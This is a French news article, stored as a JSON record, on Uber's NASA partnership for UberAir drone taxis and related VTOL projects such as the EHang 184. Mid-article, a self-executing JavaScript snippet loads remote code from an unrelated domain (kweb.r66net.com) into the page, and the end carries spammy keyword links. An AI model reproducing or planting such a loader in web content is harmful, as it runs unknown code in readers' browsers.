{"title": "Uber s'allie à la Nasa pour ses drones taxis", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "09/11/2017", "content": "Uber a signé un partenariat avec la Nasa en vue de collaborer au développement de son service de drones taxis. L'entreprise espère tester celui-ci dès 2020. L'Agence spatiale américaine travaillera sur un système de régulation du trafic de ces engins autonomes. Uber espère bien conquérir la voie des  airs  comme il l'a fait sur terre avec son service de VTC. Pour cela, la société travaille sur un projet de  drones taxis  à décollage et atterrissage verticaux qui pourront transporter des passagers sur des trajets urbains courts. À l'occasion du  Web Summit  qui se tient cette semaine à Lisbonne (Portugal), l'entreprise a annoncé avoir signé un accord avec la Nasa dans le but de faire avancer ce projet. Selon la chaîne américaine  CNBC  qui a relayé l'information, Uber a signé un  Space Act Agreement  avec l'agence spatiale pour le développement d'un système de gestion du trafic d'engins autonomes volant à basse altitude. D'après le document publié par la  Nasa , que nous avons consulté, l'accord d'un montant de 376.000 dollars (environ 323.000 euros au cours actuel) a été signé en janvier 2017 et arrivera à expiration en janvier 2022.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Uber veut des taxis volants pour les JO de Los Angeles 2028 Aucun détail spécifique n'est fourni quant au travail que la Nasa va accomplir et de quelle manière Uber exploitera celui-ci pour son service baptisé UberAir (anciennement  Uber Elevate ). Mais l'on sait que l'Agence spatiale américaine planche sur cette technologie et la  teste  depuis l'année dernière avec des drones. L'idée principale du concept est de créer des corridors aériens contrôlés par géorepérage (en anglais  geofencing ) pour répartir les différents types de drones : loisir, livraison, taxis... L'objectif affiché est de rendre le service UberAir opérationnel avant les Jeux olympiques de 2028, à Los Angeles. L'entreprise vise un tarif initial pour une course qui soit à peine plus élevé que celui d'un trajet UberX en voiture. Les premiers essais sont prévus à partir de 2020 dans plusieurs grandes villes : Los Angeles et Dallas, aux États-Unis, et  Dubaï , aux Émirats arabes unis.   Pour en savoir plus Uber travaille sur un concept de drone taxi Article initial de Marc Zaffagni, paru le 27/09/2016 Le service de véhicule de transport avec chauffeur Uber a révélé qu'il travaillait sur un projet de  drone  à décollage et atterrissage verticaux qui pourrait acheminer des passagers sur des trajets urbains courts. Étonnante, l'idée n'est pourtant pas nouvelle. D'ici une dizaine d'années de cela, lorsque vous dégainerez votre  smartphone  pour commander un Uber, celui n'arrivera peut-être pas par la route, mais par les airs ! Le service de véhicule de transport avec chauffeur (VTC) vient de dévoiler qu'il planchait sur l'idée d'un  drone  taxi autonome à décollage et atterrissage verticaux. Un concept connu en français sous l'acronyme d'Adav ( aéronef  à décollage et atterrissage verticaux) et en anglais sous celui de VTOL ( Vertical Take-Off and Landing Aircraft ). Dans un entretien avec le site  Recode , Jeff Holden, un dirigeant d'Uber, a indiqué que ce type d'appareil pourrait décoller depuis les  toits  des bâtiments pour effectuer des trajets interurbains et ainsi contribuer à réduire le trafic  automobile  lié aux  migrations pendulaires . L'avantage de l'Adav est qu'il combine la souplesse de l' hélicoptère  pour le décollage et l'atterrissage tout en bénéficiant des ailes de l'avion qui lui permettent de voler plus silencieusement. Uber, qui teste déjà des  voitures autonomes , estime qu'un tel service de drone taxi pourrait être opérationnel d'ici une décennie. Larry Page finance une voiture volante Difficile à imaginer tant les obstacles techniques, légaux et les questions de sécurité qui se posent semblent nombreux. Pourtant, Uber n'est pas du tout le premier à envisager cette solution. Lors du  Consumer Electronics Show , en janvier dernier, la société chinoise EHang avait fait sensation en présentant l' EHang 184 , un drone autonome destiné au transport de personnes. Il s'agit d'un quadrirotor capable d'emporter un passager et ses bagages à 100 km/h et de naviguer en totale autonomie durant 23 minutes. Sa commercialisation est prévue cette année. Et l'on sait que  Larry Page , le cofondateur de  Google , a investi 100 millions de dollars dans  Zee.Aero , une jeune pousse qui développe une voiture volante... EHang 184 : ce drone taxi vous emmène partout en un clin d’œil                       L’idée d’un taxi personnel et autonome est séduisante, surtout si celui-ci est capable de voler comme le EHang 184, présenté en 2016. En plus de pouvoir se déplacer rapidement et d’être intégralement électrique, le véhicule ne demande aucune connaissance de pilotage. Le voici présenté en vidéo.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  romeo chauffeur de taxi  |  concept emergence  |  fransdal concept  |  proof of concept  |  fagor innova concept  |  frigo fagor innova concept  |  le drone  |  drone  |  drone militaire  |  drone urbain", "theme": "tech"}